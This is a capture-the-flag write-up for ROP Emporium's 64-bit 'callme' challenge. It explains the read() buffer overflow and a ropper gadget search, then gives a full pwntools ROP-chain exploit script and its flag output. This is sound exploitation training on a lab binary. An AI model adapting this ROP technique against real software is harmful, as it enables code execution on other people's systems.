# callme - 64 Bit
Program execution:
```
callme by ROP Emporium
x86_64

Hope you read the instructions...

> <input_here>
```
Run checksec: `checksec ./callme`
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```
Same as usual, `main` calls `pwnme` which has a buffer overflow vulnerability due to unsafe usage of `read`. In this case 0x200 bytes can be read into a 32 byte buffer starting at address `rbp-0x20`:
```assembly
lea     rax, [rbp-0x20 {var_28}]
mov     edx, 0x200
mov     rsi, rax {var_28}
mov     edi, 0x0
call    read
```
With the knowledge we can control code flow, we can go about following the given instructions. We need to call `callme_one`, `callme_two` and `callme_three`. For each call there are 3 parameters: `0xdeadbeefdeadbeef`, `0xcafebabecafebabe`, `0xd00df00dd00df00d`.

To do the first function call we know we need to pop arguments 1-3 off the stack and into registers RDI, RSI, RDX, respectively, before calling `callme_one`.

Let's find some suitable gadgets for this task with `ropper`.
`ropper -f callme --search 'pop'`:
```
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme
0x000000000040099c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040099e: pop r13; pop r14; pop r15; ret;
0x00000000004009a0: pop r14; pop r15; ret;
0x00000000004009a2: pop r15; ret;
0x00000000004007bb: pop rbp; mov edi, 0x601070; jmp rax;
0x000000000040099b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040099f: pop rbp; pop r14; pop r15; ret;
0x00000000004007c8: pop rbp; ret;
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
0x00000000004009a3: pop rdi; ret;
0x000000000040093e: pop rdx; ret;
0x00000000004009a1: pop rsi; pop r15; ret;
0x000000000040093d: pop rsi; pop rdx; ret;
0x000000000040099d: pop rsp; pop r13; pop r14; pop r15; ret;
```
We need to pop 3 items off the stack and into RDI, RSI and RDX, so `pop rdi; pop rsi; pop rdx; ret;` is exactly what we are after. So our general structure for a payload to call one function (after padding and stack alignment) is:
* pop rdi; pop rsi; pop rdx; ret;
* `0xdeadbeefdeadbeef`
* `0xcafebabecafebabe`
* `0xd00df00dd00df00d`
* `callme_one` address

This will then be repeated for each of the functions.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./callme"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

pop_rdi_rsi_rdx_addr = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx'])[0]
ret_addr = rop.find_gadget(['ret'])[0]

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p64(ret_addr)

for func in ['callme_one', 'callme_two', 'callme_three']:
	payload += p64(pop_rdi_rsi_rdx_addr)
	payload += p64(0xdeadbeefdeadbeef)
	payload += p64(0xcafebabecafebabe)
	payload += p64(0xd00df00dd00df00d)
	payload += p64(elf.symbols[func])

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
